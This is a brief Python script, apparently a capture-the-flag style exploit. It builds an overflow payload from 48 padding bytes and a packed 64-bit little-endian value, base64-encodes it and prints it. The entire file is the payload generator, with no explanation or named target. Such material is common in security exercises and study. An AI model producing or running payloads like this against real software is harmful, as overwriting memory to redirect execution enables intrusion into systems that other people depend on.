
import sys
import struct
import base64

buf = b'hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh'
buf += struct.pack('<Q', 3634854317272118854)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
